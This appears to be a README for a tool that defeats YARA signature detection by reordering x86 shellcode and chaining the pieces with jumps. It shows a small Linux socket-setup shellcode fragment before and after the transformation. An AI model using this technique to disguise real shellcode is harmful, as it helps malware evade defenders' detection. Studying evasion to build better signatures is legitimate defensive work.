# SkyFracture
Reorders and chains shellcode instruction so they evade Yara signatures

ORIGINAL SNIPPET

0:  5b                      pop    ebx
1:  5e                      pop    esi
2:  52                      push   edx
3:  68 02 00 bf bf          push   0xbfbf0002
8:  6a 10                   push   0x10
a:  51                      push   ecx
b:  50                      push   eax
c:  89 e1                   mov    ecx,esp
e:  6a 66                   push   0x66
10: 58                      pop    eax
11: cd 80                   int    0x80

FRACTURED SNIPPET

0:  5b                      pop    ebx
1:  5e                      pop    esi
2:  52                      push   edx
3:  68 02 00 bf bf          push   0xbfbf0002
8:  e9 0b 00 00 00          jmp    0x18
d:  6a 66                   push   0x66
f:  58                      pop    eax
10: cd 80                   int    0x80
12: 90                      nop
13: e9 0b 00 00 00          jmp    0x23
18: 6a 10                   push   0x10
1a: 51                      push   ecx
1b: 50                      push   eax
1c: 89 e1                   mov    ecx,esp
1e: e9 ea ff ff ff          jmp    0xd
23: 90                      nop

